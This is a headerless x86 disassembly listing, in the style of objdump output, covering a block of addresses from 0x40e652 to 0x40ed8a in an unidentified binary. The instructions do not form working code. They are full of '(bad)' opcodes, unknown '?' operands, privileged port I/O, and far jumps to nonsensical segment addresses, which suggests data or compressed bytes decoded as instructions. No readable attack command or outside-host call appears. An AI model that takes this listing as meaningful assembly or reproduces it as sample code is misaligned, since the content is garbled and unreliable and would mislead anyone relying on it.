  40e652:	pop    esp
  40e653:	and    al,0xb1
  40e655:	sub    ecx,DWORD PTR [ecx+0x70]
  40e658:	aam    0x7b
  40e65a:	add    DWORD PTR [ebp+edx*8+0x7d],0xffffff85
  40e65f:	inc    esp
  40e660:	aad    0xa9
  40e662:	add    DWORD PTR [ebp+edx*8-0xb],0xffffff86
  40e667:	inc    esp
  40e668:	test   DWORD PTR [esi-0x196abb7d],edx
  40e66e:	xchg   BYTE PTR [ebp+edx*4-0x76],al
  40e672:	add    DWORD PTR [ebp+edx*4-0x66],0x92854c85
  40e67a:	pop    esi
  40e67b:	lea    edi,[esi]
  40e67d:	lds    eax,FWORD PTR [esi-0x19756aac]
  40e683:	pop    ebx
  40e684:	add    al,0xb7
  40e686:	push   cs
  40e687:	(bad)  
  40e688:	jmp    0xeb4:0x79fff039
  40e68f:	add    BYTE PTR [eax-0x1fb97935],dl
  40e695:	dec    esp
  40e696:	mov    ah,0x8b
  40e698:	add    BYTE PTR [eax],al
  40e69a:	add    BYTE PTR [eax],al
  40e69c:	add    BYTE PTR [eax-0x3afcf435],dl
  40e6a2:	fcmovnu st,st(4)
  40e6a4:	dec    edi
  40e6a5:	fbld   TBYTE PTR [ecx]
  40e6a7:	jns    0x40e71c
  40e6a9:	je     0x40e6ca
  40e6ab:	fisttp DWORD PTR [edx-0x3c51cbb]
  40e6b1:	das    
  40e6b2:	loopne 0x40e641
  40e6b4:	mov    edx,0xbcb14
  40e6b9:	xchg   esp,eax
  40e6ba:	loopne 0x40e72c
  40e6bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6bd:	nop
  40e6be:	retf   
  40e6bf:	or     ecx,DWORD PTR [ebp+0x5036b754]
  40e6c5:	sbb    edx,DWORD PTR [ebx+eiz*2]
  40e6c8:	mov    al,ds:0x8b0bcd7e
  40e6cd:	fs out dx,eax
  40e6cf:	retf   
  40e6d0:	mov    ah,al
  40e6d2:	push   ebp
  40e6d3:	pusha  
  40e6d4:	jge    0x40e72d
  40e6d6:	dec    esi
  40e6d7:	addr16 jae 0x40e662
  40e6da:	push   esp
  40e6db:	scas   eax,DWORD PTR es:[edi]
  40e6dc:	adc    ecx,DWORD PTR [ebx]
  40e6de:	xchg   BYTE PTR [edx],dl
  40e6e0:	jmp    0x40e755
  40e6e2:	inc    esp
  40e6e3:	into   
  40e6e4:	and    ecx,DWORD PTR [esi+ecx*2+0x4a]
  40e6e8:	je     0x40e691
  40e6ea:	test   DWORD PTR [edx],ecx
  40e6ec:	and    BYTE PTR [eax-0x60004b35],dl
  40e6f2:	retf   
  40e6f3:	or     ebp,eax
  40e6f5:	shl    ebp,0xc
  40e6f8:	add    BYTE PTR [ebx],cl
  40e6fa:	xchg   ebx,eax
  40e6fb:	test   DWORD PTR [ebx+0x6c],eax
  40e6fe:	packuswb mm0,QWORD PTR [ebx]
  40e701:	add    BYTE PTR [eax],al
  40e703:	add    BYTE PTR [eax],al
  40e705:	add    BYTE PTR [ebx],bl
  40e707:	push   cs
  40e708:	adc    BYTE PTR [eax-0x35],cl
  40e70b:	xchg   edi,eax
  40e70c:	or     DWORD PTR [edx-0x7f],eax
  40e70f:	push   edi
  40e710:	dec    edx
  40e711:	jae    0x40e6b2
  40e713:	mov    dl,0xaf
  40e715:	je     0x40e6fa
  40e717:	xchg   esi,eax
  40e718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e719:	shl    DWORD PTR [esi-0x5a],cl
  40e71c:	mov    ecx,0x64b2d00d
  40e721:	inc    eax
  40e722:	mov    ebp,DWORD PTR [ebx]
  40e724:	cmp    eax,0x6f4437ce
  40e729:	add    DWORD PTR [eax-0x33e05dd5],edx
  40e72f:	xor    eax,0x2991f026
  40e734:	push   ss
  40e735:	jg     0x40e773
  40e737:	inc    edi
  40e738:	in     al,0x8a
  40e73a:	pushf  
  40e73b:	call   0x890c:0xcbd56e14
  40e742:	rcl    DWORD PTR [esi-0x697c8af7],cl
  40e748:	sbb    DWORD PTR [ebp-0x7d],esi
  40e74b:	xchg   esi,eax
  40e74c:	adc    DWORD PTR [ebp-0x7d],esi
  40e74f:	xchg   esi,eax
  40e750:	sbb    DWORD PTR [ebp-0x7d],esi
  40e753:	xchg   esi,eax
  40e754:	xor    DWORD PTR [ebp+0x63],esi
  40e757:	xchg   esi,eax
  40e758:	cmp    DWORD PTR [ebp+0x63],esi
  40e75b:	xchg   esi,eax
  40e75c:	xor    esp,edx
  40e75e:	fiadd  WORD PTR [esi-0x37]
  40e761:	iret   
  40e762:	inc    eax
  40e763:	sub    edi,DWORD PTR [ebx+0x70bd5f6b]
  40e769:	je     0x40e76b
  40e76b:	add    BYTE PTR [eax],al
  40e76d:	add    BYTE PTR [eax],al
  40e76f:	sbb    al,bl
  40e771:	ins    BYTE PTR es:[edi],dx
  40e772:	inc    esp
  40e773:	mov    bh,0x33
  40e775:	mov    ebx,0xccc99002
  40e77a:	jne    0x40e72a
  40e77c:	mov    edi,0x62574414
  40e781:	pop    eax
  40e782:	out    dx,eax
  40e783:	jae    0x40e71f
  40e785:	inc    eax
  40e786:	out    dx,eax
  40e787:	jae    0x40e723
  40e789:	dec    eax
  40e78a:	out    dx,eax
  40e78b:	mov    bl,0x9a
  40e78d:	xchg   ebp,eax
  40e78e:	je     0x40e793
  40e790:	xchg   edi,eax
  40e791:	push   cs
  40e792:	aad    0x32
  40e794:	dec    edi
  40e795:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e797:	xchg   ebx,eax
  40e798:	mov    edi,0xd742b17e
  40e79d:	pop    ebp
  40e79e:	sbb    al,0xdc
  40e7a0:	ror    ah,0xf9
  40e7a3:	xchg   ebx,eax
  40e7a4:	mov    edi,0x8383c57a
  40e7a9:	into   
  40e7aa:	push   es
  40e7ab:	aas    
  40e7ac:	xchg   ebx,eax
  40e7ad:	push   ds
  40e7ae:	cdq    
  40e7af:	arpl   WORD PTR [edi-0x11],bp
  40e7b2:	jge    0x40e753
  40e7b4:	sahf   
  40e7b5:	lods   eax,DWORD PTR ds:[esi]
  40e7b6:	jns    0x40e7e2
  40e7b8:	jae    0x40e7c8
  40e7ba:	out    0x28,al
  40e7bc:	xchg   ebx,eax
  40e7bd:	adc    bl,dh
  40e7bf:	sbb    al,0x6b
  40e7c1:	pop    ebp
  40e7c2:	sar    DWORD PTR [edi-0x43],0xef
  40e7c6:	into   
  40e7c7:	into   
  40e7c8:	scas   eax,DWORD PTR es:[edi]
  40e7c9:	push   cs
  40e7ca:	(bad)  
  40e7cb:	or     BYTE PTR [ebx-0x3fac05e2],dl
  40e7d1:	jp     0x40e7e0
  40e7d3:	add    BYTE PTR [eax],al
  40e7d5:	add    BYTE PTR [eax],al
  40e7d7:	add    BYTE PTR [edx+eiz*2+0x4383195e],ah
  40e7de:	sub    al,BYTE PTR ds:0x25654f35
  40e7e4:	mov    WORD PTR [edi-0x40703286],?
  40e7ea:	jle    0x40e825
  40e7ec:	mov    ebp,0x438409d6
  40e7f1:	ror    ah,0xd9
  40e7f4:	xchg   ebx,eax
  40e7f5:	mov    edi,0x83a3cd7a
  40e7fa:	into   
  40e7fb:	outs   dx,BYTE PTR ds:[esi]
  40e7fc:	mov    eax,0xa8661e92
  40e801:	xchg   edx,eax
  40e802:	push   ds
  40e803:	mov    ecx,0xddef6ec3
  40e808:	ja     0x40e7a8
  40e80a:	lods   eax,DWORD PTR ds:[esi]
  40e80b:	fnstenv [edx+esi*2-0x3929fff2]
  40e812:	pop    ebx
  40e813:	push   ecx
  40e814:	loope  0x40e877
  40e816:	repz inc esi
  40e819:	je     0x40e81a
  40e81b:	call   FWORD PTR [edi*1-0x23d5ae1d]
  40e822:	pop    eax
  40e823:	mov    eax,DWORD PTR [edx+eax*8+0x66]
  40e827:	inc    esp
  40e828:	imul   ebx,DWORD PTR [edx-0x3],0x83b2686f
  40e82f:	jne    0x40e89a
  40e831:	inc    eax
  40e832:	xlat   BYTE PTR ds:[ebx]
  40e833:	test   BYTE PTR [edx-0x46],dh
  40e836:	cmp    DWORD PTR [edx+0x29],ebp
  40e839:	loopne 0x40e82a
  40e83b:	push   ebp
  40e83c:	add    BYTE PTR [eax],al
  40e83e:	add    BYTE PTR [eax],al
  40e840:	add    BYTE PTR [ebx],dl
  40e842:	mov    bh,0x83
  40e844:	iret   
  40e845:	inc    ecx
  40e846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e847:	cmp    BYTE PTR [edx],al
  40e849:	cmp    DWORD PTR ds:0xc64685f7,edi
  40e84f:	sub    eax,0xc95feff
  40e854:	add    cl,bh
  40e856:	cmp    al,0xc0
  40e858:	call   0x4fe2d2
  40e85d:	ins    BYTE PTR es:[edi],dx
  40e85e:	jno    0x40e8db
  40e860:	or     dh,BYTE PTR [edx-0xf]
  40e863:	pop    ebx
  40e864:	test   DWORD PTR [ecx],edi
  40e866:	(bad)  
  40e867:	or     al,0x8b
  40e869:	mov    DWORD PTR [esi+0x1b11cf84],edi
  40e86f:	cmp    al,0x1
  40e871:	jmp    0x166162b6
  40e876:	mov    ebx,0xa9bcff13
  40e87b:	out    dx,eax
  40e87c:	jne    0x40e85b
  40e87e:	fcomi  st,st(0)
  40e880:	push   ebp
  40e881:	aad    0x3c
  40e883:	fild   WORD PTR [edx+edx*2-0x5817f53b]
  40e88a:	ror    DWORD PTR [esi],0x0
  40e88d:	nop
  40e88e:	add    al,0x71
  40e890:	lds    esi,FWORD PTR [esi]
  40e892:	add    BYTE PTR [ebx],dh
  40e894:	shr    DWORD PTR [ebx+ecx*8+0x7c748ad6],0xf6
  40e89c:	pop    ss
  40e89d:	xor    ebx,edi
  40e89f:	rol    BYTE PTR [ebx-0x70],cl
  40e8a2:	mov    esi,?
  40e8a4:	adc    eax,DWORD PTR [eax]
  40e8a6:	add    BYTE PTR [eax],al
  40e8a8:	add    BYTE PTR [eax],al
  40e8aa:	outs   dx,DWORD PTR ds:[esi]
  40e8ab:	push   ds
  40e8ac:	sbb    al,0xff
  40e8ae:	(bad)  
  40e8b0:	jl     0x40e926
  40e8b2:	mov    BYTE PTR [ebx+edi*8-0x2f4c3ea9],ah
  40e8b9:	dec    BYTE PTR [edi-0x4c]
  40e8bc:	faddp  st(1),st
  40e8be:	pushf  
  40e8bf:	retf   
  40e8c0:	(bad)  
  40e8c1:	mov    ch,BYTE PTR [esp+eax*8]
  40e8c4:	not    DWORD PTR [edi]
  40e8c6:	icebp  
  40e8c7:	cmp    dl,dl
  40e8c9:	inc    ebx
  40e8ca:	nop
  40e8cb:	aam    0xf7
  40e8cd:	adc    esp,DWORD PTR [edi]
  40e8cf:	data16 sbb bh,bh
  40e8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8d3:	xlat   BYTE PTR ds:[ebx]
  40e8d4:	jle    0x40e94a
  40e8d6:	mov    ah,ch
  40e8d8:	cli    
  40e8d9:	pop    ebx
  40e8da:	popa   
  40e8db:	jecxz  0x40e8a2
  40e8dd:	inc    BYTE PTR [edi]
  40e8df:	cld    
  40e8e0:	mov    edi,0xd8cba4c1
  40e8e5:	mov    ah,ah
  40e8e7:	inc    edi
  40e8e8:	outs   dx,BYTE PTR ds:[esi]
  40e8e9:	sbb    ebx,DWORD PTR ds:0x3e52527e
  40e8ef:	test   al,dl
  40e8f1:	daa    
  40e8f2:	or     ebx,DWORD PTR [edx]
  40e8f4:	(bad)  
  40e8f5:	out    0xc6,eax
  40e8f7:	sub    DWORD PTR [eax+eax*1],ecx
  40e8fa:	sbb    esi,DWORD PTR [esi+0x6ba58b0e]
  40e900:	sbb    BYTE PTR [eax-0x70],al
  40e903:	push   esi
  40e904:	(bad)  
  40e905:	out    0x60,eax
  40e907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e908:	jge    0x40e8dc
  40e90a:	sbb    DWORD PTR [edx+0x339f],esi
  40e910:	add    BYTE PTR [eax],al
  40e912:	add    BYTE PTR ds:0x6208daf2,cl
  40e918:	repnz dec esi
  40e91a:	dec    esi
  40e91b:	nop
  40e91c:	mov    dl,0xe5
  40e91e:	fnstsw WORD PTR [eax-0x17a06cd3]
  40e924:	retf   0x638a
  40e927:	nop
  40e928:	mov    dl,0x6a
  40e92a:	(bad)  
  40e92b:	imul   esp,DWORD PTR [ebx-0x68],0x70
  40e92f:	inc    edx
  40e930:	sub    ah,BYTE PTR [eax-0x660cf2c9]
  40e936:	arpl   cx,bp
  40e938:	mov    BYTE PTR [edx-0x29],ch
  40e93b:	imul   ebx,DWORD PTR [edx+0xd],0xffffff80
  40e93f:	xor    BYTE PTR [edx-0x3133811b],dh
  40e945:	xchg   ebp,eax
  40e946:	fdivr  DWORD PTR [esi]
  40e948:	loopne 0x40e9b8
  40e94a:	retf   0x357f
  40e94d:	es clc 
  40e94f:	push   esi
  40e950:	dec    ecx
  40e951:	sbb    al,0x7f
  40e953:	mov    esp,0xa25c4ece
  40e958:	shl    esi,1
  40e95a:	add    eax,DWORD PTR ds:0x66d3b176
  40e960:	mov    ebx,0x7e4d7a94
  40e965:	push   0x43
  40e967:	or     DWORD PTR [esp+ecx*2],0x20
  40e96b:	add    eax,0xf7cab166
  40e970:	pop    eax
  40e971:	xchg   BYTE PTR [edx],al
  40e973:	nop
  40e974:	sub    eax,0x602b
  40e979:	add    BYTE PTR [eax],al
  40e97b:	add    BYTE PTR [edi+0x63],cl
  40e97e:	cwde   
  40e97f:	push   esp
  40e980:	or     BYTE PTR [ebp+0x25],dh
  40e983:	xchg   DWORD PTR [edi],ecx
  40e985:	inc    edi
  40e986:	push   edx
  40e987:	fnsave [ebp+ebp*1+0x1b]
  40e98b:	pusha  
  40e98c:	pop    eax
  40e98d:	retf   0x280e
  40e990:	xor    esi,DWORD PTR [edx-0x3829a3f2]
  40e996:	pop    esi
  40e997:	mov    esi,0xa785e020
  40e99c:	xlat   BYTE PTR ds:[ebx]
  40e99d:	ss iret 
  40e99f:	out    0xf,al
  40e9a1:	inc    esp
  40e9a2:	out    dx,eax
  40e9a3:	dec    esi
  40e9a4:	add    BYTE PTR [edx+0x20],cl
  40e9a7:	je     0x40ea07
  40e9a9:	(bad)  
  40e9aa:	push   ebp
  40e9ab:	push   ecx
  40e9ac:	mov    bh,0xd1
  40e9ae:	or     eax,0xe276f6e9
  40e9b3:	cdq    
  40e9b4:	dec    eax
  40e9b5:	mov    esp,0x735970db
  40e9ba:	mov    DWORD PTR [ecx],ebp
  40e9bc:	nop
  40e9bd:	ss push esp
  40e9bf:	push   ss
  40e9c0:	loopne 0x40e97e
  40e9c2:	fs mov esi,0xa0e666ce
  40e9c8:	jmp    0x40e97e
  40e9ca:	in     eax,dx
  40e9cb:	call   0x18b1763
  40e9d0:	arpl   WORD PTR [edi+ebp*8+0x1a],sp
  40e9d4:	stos   BYTE PTR es:[edi],al
  40e9d5:	jne    0x40ea19
  40e9d7:	ins    BYTE PTR es:[edi],dx
  40e9d8:	int3   
  40e9d9:	lods   al,BYTE PTR ds:[esi]
  40e9da:	mov    bl,BYTE PTR [edi]
  40e9dc:	scas   eax,DWORD PTR es:[edi]
  40e9dd:	mov    esp,0x43ef
  40e9e2:	add    BYTE PTR [eax],al
  40e9e4:	add    BYTE PTR [ebp+ebp*1+0x5a],bl
  40e9e8:	rcr    ebp,0xd2
  40e9eb:	in     al,0xc9
  40e9ed:	lea    esi,[edx+0x6b5c2481]
  40e9f3:	push   edi
  40e9f4:	mov    dh,0x63
  40e9f6:	sub    cl,BYTE PTR [ecx+0x19]
  40e9f9:	sbb    ebx,edi
  40e9fb:	jmp    FWORD PTR [ebp+ebp*4-0x45]
  40e9ff:	out    dx,eax
  40ea00:	sahf   
  40ea01:	mov    edx,0x683c8181
  40ea06:	pop    edx
  40ea07:	out    0x9c,al
  40ea09:	xor    al,0xb2
  40ea0b:	push   cs
  40ea0c:	add    BYTE PTR [ecx+ebp*8],bh
  40ea0f:	jmp    0x40ea61
  40ea11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea12:	dec    ebx
  40ea13:	fmul   QWORD PTR [ecx-0x3f752599]
  40ea19:	into   
  40ea1a:	xor    cl,BYTE PTR [edi+edi*8]
  40ea1d:	cs dec ebx
  40ea1f:	xor    ch,BYTE PTR gs:[ecx+ebx*8]
  40ea23:	fistp  WORD PTR [ecx+0x51]
  40ea26:	push   es
  40ea27:	rol    BYTE PTR [ecx],1
  40ea29:	jns    0x40ea5e
  40ea2b:	dec    ebx
  40ea2c:	lock sub ecx,esp
  40ea2f:	lock rol DWORD PTR [eax],cl
  40ea32:	icebp  
  40ea33:	push   edi
  40ea34:	test   DWORD PTR [ecx-0x40187447],ebp
  40ea3a:	dec    ecx
  40ea3b:	lock push 0x4a
  40ea3e:	xor    ebx,DWORD PTR [ebx-0x10]
  40ea41:	push   eax
  40ea42:	pop    esi
  40ea43:	pushf  
  40ea44:	loopne 0x40eaae
  40ea46:	mov    dh,0x81
  40ea48:	inc    ebp
  40ea49:	add    BYTE PTR [eax],al
  40ea4b:	add    BYTE PTR [eax],al
  40ea4d:	add    BYTE PTR [ecx-0x5500a722],ch
  40ea53:	aaa    
  40ea54:	dec    ecx
  40ea55:	pop    esp
  40ea56:	mov    ah,0x6e
  40ea58:	add    BYTE PTR [ebx+esi*2+0x13fff048],al
  40ea5f:	add    BYTE PTR [ecx-0x1818beab],0x76
  40ea66:	dec    ecx
  40ea67:	scas   eax,DWORD PTR es:[edi]
  40ea68:	push   cs
  40ea69:	lea    esp,[esi+edx*2+0x3f]
  40ea6d:	push   edi
  40ea6e:	fisub  WORD PTR [esi+eax*4+0x46]
  40ea72:	pop    ecx
  40ea73:	sub    esi,DWORD PTR [eax-0xded8af1]
  40ea79:	(bad)  
  40ea7a:	fdivr  QWORD PTR ds:[edx]
  40ea7d:	lea    eax,[esi+edx*2+0x4e50e856]
  40ea84:	push   cs
  40ea85:	add    BYTE PTR [edx+ebp*8-0x19],ch
  40ea89:	push   eax
  40ea8a:	nop
  40ea8b:	js     0x40eaec
  40ea8d:	rcr    BYTE PTR [ecx],cl
  40ea8f:	xchg   edx,eax
  40ea90:	out    0x84,al
  40ea92:	rol    al,1
  40ea94:	xchg   DWORD PTR [edi+0x696038be],ecx
  40ea9a:	jle    0x40eaea
  40ea9c:	(bad)  
  40ea9d:	jmp    0x40eae8
  40ea9f:	xor    esp,DWORD PTR [eax]
  40eaa1:	loopne 0x40ea34
  40eaa3:	retf   
  40eaa4:	mov    es,WORD PTR [esp+ebp*4-0x5]
  40eaa8:	fdivr  st,st(6)
  40eaaa:	ret    
  40eaab:	push   edx
  40eaac:	leave  
  40eaad:	addr16 adc eax,0x83f08b
  40eab3:	add    BYTE PTR [eax],al
  40eab5:	add    BYTE PTR [eax],al
  40eab7:	add    esi,DWORD PTR [edx+0x60]
  40eaba:	(bad)  
  40eabb:	jmp    0x5422:0x68548ec0
  40eac2:	push   ds
  40eac3:	jo     0x40ea8f
  40eac5:	or     ecx,DWORD PTR [ebp+0x56dba3cd]
  40eacb:	pop    edi
  40eacc:	jl     0x40eb40
  40eace:	inc    ebp
  40eacf:	in     al,0x46
  40ead1:	dec    ebx
  40ead2:	push   cs
  40ead3:	adc    al,0x1
  40ead5:	(bad)  
  40ead6:	inc    BYTE PTR [edi+0x25]
  40ead9:	and    al,0x8d
  40eadb:	in     eax,0xa3
  40eadd:	ret    0x92e7
  40eae0:	stos   DWORD PTR es:[edi],eax
  40eae1:	or     al,BYTE PTR [eax]
  40eae3:	sbb    eax,0xbf4f540e
  40eae8:	rcr    BYTE PTR [ebp-0x78],1
  40eaeb:	(bad)  
  40eaec:	pop    ebx
  40eaed:	xchg   DWORD PTR [edi-0x1dcb879],edi
  40eaf3:	psubsb mm2,mm4
  40eaf6:	cmp    BYTE PTR ds:0xe8585296,dl
  40eafc:	in     eax,dx
  40eafd:	inc    ecx
  40eafe:	add    BYTE PTR [eax+0x40e7c74e],dl
  40eb04:	mov    al,ds:0xb20dd261
  40eb09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb0a:	jnp    0x40eb61
  40eb0c:	ds loopne 0x40eaa5
  40eb0f:	pop    ss
  40eb10:	pop    ecx
  40eb11:	aaa    
  40eb12:	leave  
  40eb13:	fdiv   st,st(3)
  40eb15:	in     eax,dx
  40eb16:	add    ebx,DWORD PTR [ebp+0x2d]
  40eb19:	call   0x0:0xd3
  40eb20:	lds    ebp,FWORD PTR [esi-0x4dac2507]
  40eb26:	out    0xd4,al
  40eb28:	sbb    bh,BYTE PTR [ecx+edi*8+0x5ef26204]
  40eb2f:	stos   BYTE PTR es:[edi],al
  40eb30:	nop
  40eb31:	mov    dl,0xe5
  40eb33:	sar    BYTE PTR ds:0xf8f4132d,1
  40eb39:	outs   dx,BYTE PTR ds:[esi]
  40eb3a:	in     eax,0x30
  40eb3c:	imul   ebp,DWORD PTR [esi],0x30
  40eb3f:	test   eax,0x9004894a
  40eb45:	mov    dl,0x94
  40eb47:	ins    BYTE PTR es:[edi],dx
  40eb48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb49:	mov    ah,BYTE PTR [eax+ecx*8+0x67]
  40eb4d:	mov    ecx,0x7281ebf2
  40eb52:	in     eax,0x86
  40eb54:	pop    ss
  40eb55:	aas    
  40eb56:	in     al,dx
  40eb57:	js     0x40ebb0
  40eb59:	retf   
  40eb5a:	int    0x5a
  40eb5c:	inc    esi
  40eb5d:	mov    eax,0xb52a747c
  40eb62:	jl     0x40ebd5
  40eb64:	or     al,0xc1
  40eb66:	call   0xe5f297f2
  40eb6b:	add    ecx,DWORD PTR [esi+0x6e]
  40eb6e:	call   0x7df51675
  40eb73:	into   
  40eb74:	push   ss
  40eb75:	pusha  
  40eb76:	ss jns 0x40eb56
  40eb79:	retf   0x6e6e
  40eb7c:	push   es
  40eb7d:	mov    eax,0x2e8e4361
  40eb82:	push   ss
  40eb83:	add    eax,DWORD PTR [eax]
  40eb85:	add    BYTE PTR [eax],al
  40eb87:	add    BYTE PTR [eax],al
  40eb89:	nop
  40eb8a:	mov    dl,0xe
  40eb8c:	shr    esp,0x4b
  40eb8f:	or     eax,0xfff80fe9
  40eb94:	ins    BYTE PTR es:[edi],dx
  40eb95:	shl    BYTE PTR [edx-0x33ef16f2],1
  40eb9b:	add    ah,BYTE PTR [ebp+ecx*1-0x78]
  40eb9f:	mov    ah,0x35
  40eba1:	div    DWORD PTR [edi+0xe]
  40eba4:	xchg   ecx,eax
  40eba5:	out    dx,eax
  40eba6:	jl     0x40ebb4
  40eba8:	jmp    0x6c40e3bb
  40ebad:	dec    edi
  40ebae:	mov    bh,0xef
  40ebb0:	jmp    0x7443b7c5
  40ebb5:	fld    QWORD PTR [ebx+0x775bdcb4]
  40ebbb:	push   cs
  40ebbc:	inc    ecx
  40ebbd:	aaa    
  40ebbe:	jl     0x40ebcc
  40ebc0:	jmp    0x6c40e2d3
  40ebc5:	out    0xb7,eax
  40ebc7:	out    dx,eax
  40ebc8:	jmp    0x6443b6dd
  40ebcd:	sub    eax,0xab89b47f
  40ebd2:	ja     0x40ebe2
  40ebd4:	adc    edi,ebx
  40ebd6:	jl     0x40ebe4
  40ebd8:	jmp    0x6c40e2eb
  40ebdd:	push   DWORD PTR [esi-0x34ef1611]
  40ebe3:	add    dh,BYTE PTR [ebp+edi*8+0x7a]
  40ebe7:	mov    ah,0x2a
  40ebe9:	jnp    0x40ec62
  40ebeb:	push   cs
  40ebec:	add    DWORD PTR [eax],eax
  40ebee:	add    BYTE PTR [eax],al
  40ebf0:	add    BYTE PTR [eax],al
  40ebf2:	daa    
  40ebf3:	jl     0x40ec01
  40ebf5:	jmp    0x6c40e308
  40ebfa:	lock mov dh,0xef
  40ebfd:	jmp    0x6443b710
  40ec02:	dec    edx
  40ec03:	ja     0x40ebb9
  40ec05:	mov    esp,0xe1000e77
  40ec0b:	jmp    0x3229ee44
  40ec10:	mov    al,0xf
  40ec12:	jl     0x40ec4e
  40ec14:	out    dx,eax
  40ec15:	(bad)  
  40ec16:	stc    
  40ec17:	das    
  40ec18:	in     al,0xc
  40ec1a:	fs cld 
  40ec1c:	dec    ebx
  40ec1d:	mov    edx,0x2f7880
  40ec22:	adc    edx,esi
  40ec24:	xor    al,0x2
  40ec26:	mov    ecx,0x9175b031
  40ec2b:	das    
  40ec2c:	in     al,0xc
  40ec2e:	and    al,0xfc
  40ec30:	inc    edi
  40ec31:	mov    edx,0x2f7b05
  40ec36:	adc    DWORD PTR [esi+0x33],edi
  40ec39:	add    ch,BYTE PTR [ecx-0x328a4fcf]
  40ec3f:	das    
  40ec40:	in     al,0xc
  40ec42:	hlt    
  40ec43:	clc    
  40ec44:	inc    ebx
  40ec45:	mov    edx,0x2f627b
  40ec4a:	loope  0x40ebf6
  40ec4c:	xor    eax,DWORD PTR [edx]
  40ec4e:	imul   esi,DWORD PTR [ebx],0x2d0975b0
  40ec54:	in     al,0xc
  40ec56:	add    BYTE PTR [eax],al
  40ec58:	add    BYTE PTR [eax],al
  40ec5a:	add    ah,al
  40ec5c:	clc    
  40ec5d:	aas    
  40ec5e:	mov    edx,0x2f6241
  40ec63:	xor    DWORD PTR [esi+0x33390234],0x2d5575b0
  40ec6d:	in     al,0xc
  40ec6f:	(bad)  
  40ec70:	clc    
  40ec71:	pop    ebx
  40ec72:	mov    edx,0x2f61e7
  40ec77:	xchg   ecx,eax
  40ec78:	inc    edx
  40ec79:	xor    eax,0xb0333902
  40ec7e:	jne    0x40ec01
  40ec80:	sub    eax,0xfba40ce4
  40ec85:	push   edi
  40ec86:	mov    edx,0x3f5bf290
  40ec8b:	nop
  40ec8c:	repz imul edi,DWORD PTR [ecx],0xffffff92
  40ec90:	retf   
  40ec91:	mov    ?,WORD PTR [edi-0x14772083]
  40ec97:	pushf  
  40ec98:	dec    esi
  40ec99:	mov    ch,0x5b
  40ec9b:	sub    dl,bh
  40ec9d:	pop    edx
  40ec9e:	aas    
  40ec9f:	nop
  40eca0:	and    edi,DWORD PTR [eax]
  40eca2:	cmp    DWORD PTR [edx+0x44bf8ecb],edx
  40eca8:	leave  
  40eca9:	mov    eax,0x73161b00
  40ecae:	or     al,0x40
  40ecb0:	mov    ds:0x1113ffce,al
  40ecb5:	call   FWORD PTR [ecx]
  40ecb7:	mov    eax,0x9000d0f0
  40ecbc:	dec    edi
  40ecbd:	dec    ebx
  40ecbe:	jae    0x40ecc0
  40ecc0:	add    BYTE PTR [eax],al
  40ecc2:	add    BYTE PTR [eax],al
  40ecc4:	mov    ecx,DWORD PTR [ebx-0xa]
  40ecc7:	jae    0x40ecf2
  40ecc9:	(bad)  
  40eccb:	add    DWORD PTR [eax-0x36],eax
  40ecce:	push   eax
  40eccf:	xor    DWORD PTR [ebx],ebx
  40ecd1:	(bad)  
  40ecd2:	sti    
  40ecd3:	push   0x5c71cbd4
  40ecd8:	ja     0x40ec92
  40ecda:	dec    ebx
  40ecdb:	or     DWORD PTR [ebx-0x34],0xffffffce
  40ecdf:	(bad)  
  40ece0:	sbb    esi,edx
  40ece2:	sti    
  40ece3:	push   0xef53cbd4
  40ece8:	jmp    0xc651:0x93eb0bca
  40ecef:	dec    BYTE PTR [eax+eax*4]
  40ecf2:	fisttp WORD PTR [ebx]
  40ecf4:	adc    eax,0xb07e0b5
  40ecf9:	int    0xd1
  40ecfb:	add    BYTE PTR [ebx],bl
  40ecfd:	lea    esp,[edi+ecx*1+0x62]
  40ed01:	mov    eax,ebp
  40ed03:	pop    edx
  40ed04:	mov    edi,0xc245beb2
  40ed09:	pop    edi
  40ed0a:	aaa    
  40ed0b:	rcr    DWORD PTR [edx],1
  40ed0d:	mov    ebx,0x5c7ff16a
  40ed12:	ror    BYTE PTR [edi],0x0
  40ed15:	mov    al,ds:0x50b0425
  40ed1a:	push   edx
  40ed1b:	add    al,0x90
  40ed1d:	mov    dl,0xf4
  40ed1f:	dec    esp
  40ed20:	sbb    ch,cl
  40ed22:	push   0x57
  40ed24:	arpl   WORD PTR [eax+0x817c],bx
  40ed2a:	add    BYTE PTR [eax],al
  40ed2c:	add    bh,bh
  40ed2e:	mov    cl,0xe5
  40ed30:	add    ebx,DWORD PTR [ebx]
  40ed32:	pop    esi
  40ed33:	ror    DWORD PTR [edi],0x89
  40ed36:	mov    ds:0xb21c7fd0,al
  40ed3b:	in     eax,0x3
  40ed3d:	push   ecx
  40ed3e:	xor    DWORD PTR [esi-0xc189500],esp
  40ed44:	jae    0x40edae
  40ed46:	adc    eax,0xb2900456
  40ed4b:	rcl    BYTE PTR [eax],cl
  40ed4d:	inc    ebx
  40ed4e:	popa   
  40ed4f:	fld    QWORD PTR [edx]
  40ed51:	nop
  40ed52:	scas   al,BYTE PTR es:[edi]
  40ed53:	in     eax,0x68
  40ed55:	pushf  
  40ed56:	es hlt 
  40ed58:	ret    
  40ed59:	jg     0x40ed86
  40ed5b:	popa   
  40ed5c:	xchg   esp,eax
  40ed5d:	ja     0x40ed13
  40ed5f:	in     eax,0x7e
  40ed61:	das    
  40ed62:	aas    
  40ed63:	mov    eax,0x205f9add
  40ed68:	mov    cl,0xf
  40ed6a:	mov    bl,0xe5
  40ed6c:	add    edx,DWORD PTR [edi-0x62]
  40ed6f:	lods   eax,DWORD PTR ds:[esi]
  40ed70:	adc    eax,0x5c6cb2d0
  40ed75:	or     al,0xc6
  40ed77:	cdq    
  40ed78:	fnstsw WORD PTR [esi]
  40ed7a:	aas    
  40ed7b:	ror    DWORD PTR [edi],0x5
  40ed7e:	and    al,0x5a
  40ed80:	add    al,0x90
  40ed82:	mov    dl,0xe
  40ed84:	bound  edx,QWORD PTR [ebx+0x14d95eb3]
  40ed8a:	mov    esp,0x5d7c5cef
